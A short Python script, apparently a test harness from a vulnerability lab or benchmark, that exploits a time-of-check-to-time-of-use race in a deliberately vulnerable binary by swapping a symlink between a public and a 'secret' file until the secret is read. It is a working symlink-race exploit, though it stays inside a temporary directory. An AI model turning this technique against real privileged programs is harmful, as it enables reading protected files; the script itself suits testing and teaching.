#!/usr/bin/env python3
"""Tier-1 TOCTOU / C++ — same race-script as C variant."""
import os
import subprocess
import sys
import threading
import tempfile


def main() -> int:
    binary = sys.argv[1] if len(sys.argv) > 1 else os.path.join("build", "vuln")
    with tempfile.TemporaryDirectory() as td:
        a = os.path.join(td, "safe.txt"); open(a, "w").write("PUBLIC\n")
        b = os.path.join(td, "secret.txt"); open(b, "w").write("ATTACKER_TARGET\n")
        link = os.path.join(td, "link.txt"); os.symlink(a, link)

        def attacker():
            for _ in range(2000):
                try:
                    os.unlink(link); os.symlink(b, link)
                    os.unlink(link); os.symlink(a, link)
                except OSError: pass

        t = threading.Thread(target=attacker); t.start()
        observed = set()
        for _ in range(50):
            proc = subprocess.run([binary, link], capture_output=True, timeout=5)
            observed.add(proc.stdout.decode(errors="replace").strip())
            if "ATTACKER_TARGET" in observed: break
        t.join(timeout=2)

        won = "ATTACKER_TARGET" in observed
        print(f"observed_outputs={observed} won={won}")
        return 0 if won else 1


if __name__ == "__main__":
    sys.exit(main())
